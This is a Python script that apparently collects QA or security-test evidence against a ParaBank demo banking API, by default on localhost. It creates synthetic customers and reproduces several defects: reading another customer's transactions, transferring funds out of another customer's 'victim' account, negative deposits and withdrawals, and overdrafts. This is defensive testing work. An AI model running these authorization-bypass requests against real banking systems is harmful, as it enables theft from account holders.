"""Bounded reproductions against freshly created, owned customers only. No resets."""
import argparse, http.cookiejar, json, urllib.request, urllib.parse, urllib.error, uuid
from decimal import Decimal
from pathlib import Path
import xml.etree.ElementTree as ET

class Bank:
    def __init__(self, base):
        self.base = base.rstrip('/')
        self.http = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    def request(self, method, path, params=None, accept='application/json', form=False):
        url = self.base + ('/' if form else '/services/bank/') + path
        data = None
        if form and params is not None:
            data = urllib.parse.urlencode(params).encode()
        elif params:
            url += '?' + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, data=data, method=method, headers={'Accept':accept})
        try:
            with self.http.open(req, timeout=30) as r:
                return {'status':r.status, 'body':r.read().decode(), 'content_type':r.headers.get('Content-Type','')}
        except urllib.error.HTTPError as e:
            return {'status':e.code, 'body':e.read().decode(), 'content_type':e.headers.get('Content-Type','')}
    def customer(self):
        key=uuid.uuid4().hex
        user='qa_'+key[:16]; password=key[:20]
        self.request('GET','register.htm',form=True)
        fields={'customer.firstName':'QA'+key[:8], 'customer.lastName':'Evidence',
                'customer.address.street':'1 Test St','customer.address.city':'Test',
                'customer.address.state':'CA','customer.address.zipCode':'90001',
                'customer.phoneNumber':'5550100000','customer.ssn':'999990000',
                'customer.username':user,'customer.password':password,'repeatedPassword':password}
        r=self.request('POST','register.htm',fields,form=True)
        if 'Your account was created successfully' not in r['body']:
            raise RuntimeError('Registration failed; no mutation retried')
        r=self.request('GET','login/'+user+'/'+password)
        if r['status']!=200: raise RuntimeError('Owned API login failed')
        customer=json.loads(r['body'])['id']
        account=json.loads(self.request('GET',f'customers/{customer}/accounts')['body'])[0]['id']
        return customer,account
    def balance(self, account):
        return Decimal(str(json.loads(self.request('GET',f'accounts/{account}')['body'])['balance']))

def run(base):
    findings=[]
    a=Bank(base); aid,aa=a.customer(); b=Bank(base); bid,ba=b.customer()
    b.request('POST','deposit',{'accountId':ba,'amount':'10.00'})
    response=a.request('GET',f'accounts/{ba}/transactions')
    findings.append({'id':'API-01','operation':{'method':'GET','path':f'accounts/{ba}/transactions'},'owner_customer':bid,'requester_customer':aid,'response':response,'observed':response['status']==200})
    before={'victim':str(b.balance(ba)),'requester':str(a.balance(aa))}
    response=a.request('POST','transfer',{'fromAccountId':ba,'toAccountId':aa,'amount':'1.00'})
    after={'victim':str(b.balance(ba)),'requester':str(a.balance(aa))}
    findings.append({'id':'API-02','operation':{'method':'POST','path':'transfer','parameters':{'fromAccountId':ba,'toAccountId':aa,'amount':'1.00'}},'before':before,'after':after,'response':response,'observed':Decimal(after['victim'])<Decimal(before['victim'])})
    for defect,operation in [('API-03','deposit'),('API-04','withdraw')]:
        c=Bank(base);_,account=c.customer();before=c.balance(account)
        response=c.request('POST',operation,{'accountId':account,'amount':'-10.00'});after=c.balance(account)
        findings.append({'id':defect,'operation':{'method':'POST','path':operation,'parameters':{'accountId':account,'amount':'-10.00'}},'before':str(before),'after':str(after),'response':response,'observed':before!=after})
    c=Bank(base);customer,account=c.customer()
    made=c.request('POST','createAccount',{'customerId':customer,'newAccountType':1,'fromAccountId':account})
    target=json.loads(made['body'])['id'];before=c.balance(account);amount=before+Decimal('1.00')
    response=c.request('POST','transfer',{'fromAccountId':account,'toAccountId':target,'amount':str(amount)})
    after=c.balance(account)
    findings.append({'id':'API-05','operation':{'method':'POST','path':'transfer','parameters':{'fromAccountId':account,'toAccountId':target,'amount':str(amount)}},'before':str(before),'after':str(after),'response':response,'observed':after<0})
    wadl=c.request('GET','?_wadl',accept='application/xml')
    xml=c.request('GET',f'accounts/{account}',accept='application/xml')
    schema=ET.fromstring(wadl['body']);namespaces=[s.get('targetNamespace') for s in schema.findall('.//{http://www.w3.org/2001/XMLSchema}schema')]
    actual=ET.fromstring(xml['body']).tag
    findings.append({'id':'API-06','operation':{'method':'GET','path':f'accounts/{account}','accept':'application/xml'},'declared_namespaces':namespaces,'actual_root':actual,'response':xml,'observed':not actual.startswith('{') and bool(namespaces)})
    return {'base':base,'scope':'Owned synthetic customers; no public administration, reset or concurrency','findings':findings}

if __name__=='__main__':
    ap=argparse.ArgumentParser();ap.add_argument('--base',default='http://localhost:8081/parabank');ap.add_argument('--output',default='evidence/api-reproductions.json');args=ap.parse_args()
    result=run(args.base);out=Path(args.output);out.parent.mkdir(parents=True,exist_ok=True);out.write_text(json.dumps(result,indent=2)+'\n',encoding='utf8')
    for f in result['findings']: print(f['id'], 'REPRODUCED' if f['observed'] else 'NOT REPRODUCED')
